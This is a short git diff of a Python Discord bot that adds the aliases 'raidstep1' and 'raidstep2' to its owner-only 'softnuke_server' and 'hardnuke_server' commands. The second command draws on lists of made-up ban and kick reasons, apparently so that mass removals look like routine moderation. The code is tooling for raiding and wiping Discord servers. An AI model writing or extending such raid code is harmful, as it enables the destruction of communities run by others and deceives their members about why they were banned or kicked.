@@ -323,7 +323,7 @@ Nuke performed by: <@{ctx.author.id}>""")
         await new_channel.edit(position=channelpos)
 
 
-@bot.command(name='softnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!!')
+@bot.command(name='softnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!!', aliases=['raidstep1'])
 async def nuke_server_fr(ctx):
     if str(ctx.author.id) != '762152955382071316':
         print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .softnuke_server")
@@ -348,7 +348,7 @@ async def nuke_server_fr(ctx):
         await nuke_channel_2(ctx)
 
 
-@bot.command(name='hardnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!! PLSPLSPLS')
+@bot.command(name='hardnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!! PLSPLSPLS', aliases=['raidstep2'])
 async def nuke_server_fr(ctx):
     rlist = ["Scammer", "Scam Link", "Banned", "Used .ban command", "No Reason Provided", "Dm advertising", "Broke rules", "Ban command used", None]
     krlist = ["Kicked for inactivity", "Violation of rules", "Break rules", "Kick command used", "Kicked bot", None]
